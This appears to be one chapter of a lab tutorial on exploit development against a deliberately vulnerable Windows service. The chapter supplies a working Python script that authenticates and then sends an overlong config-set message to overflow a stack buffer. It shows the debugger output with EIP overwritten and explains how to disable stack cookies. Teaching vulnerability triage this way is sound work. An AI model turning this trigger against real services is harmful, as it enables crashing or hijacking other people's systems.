## 4. Triggering the crash

Now make the service die on demand. You need a valid header, an authenticated
session, then an over-long `OP_CONFIG_SET` body.

The frame is `[magic u32][opcode u16][flags u16][body_len u32][body]`. A minimal
Python trigger (full version in `exploit/exploit.py`):

```python
import socket, struct

MAGIC = 0x53564C56
def frame(opcode, body, flags=0):
    return struct.pack("<IHHI", MAGIC, opcode, flags, len(body)) + body

s = socket.create_connection(("192.168.x.x", 9999))
s.sendall(frame(0x0002, b"USER researcher\n"))   # OP_AUTH  → sets authenticated
s.recv(512)
body = b"set name " + b"A" * 2000                # OP_CONFIG_SET, huge 3rd token
s.sendall(frame(0x0021, body))
s.recv(512)
```

Attach WinDbg to `service.exe` first (`g` to let it run), then fire. The token
after `set name ` lands in `value[256]`, overruns it, and smashes the saved
return address of `parse_config_set`.

```
(xxxx.xxxx): Access violation - code c0000005 (first chance)
eip=41414141 esp=0133e320 ebp=41414141
41414141 ??              ???
```

`eip=41414141`. Straight EIP control, no SEH needed. If instead you see a cookie
crash (`__report_gsfailure`), you built with `/GS` on — rebuild `/GS-`.

> **Design decision — why authenticate?** The `c->authenticated` gate is not an
> obstacle to remove; it is a reachability *condition* to satisfy. `OP_AUTH`
> with any non-empty username flips it. Skipping it makes the vulnerable handler
> return `ST_NOAUTH` before reaching the parser — you would be fuzzing a dead
> path. Recognising required preconditions is core triage.

---

---

[← Previous](03-choosing-a-gadget-source.md) · [Index](00-index.md) · [Next →](05-controlling-eip.md)
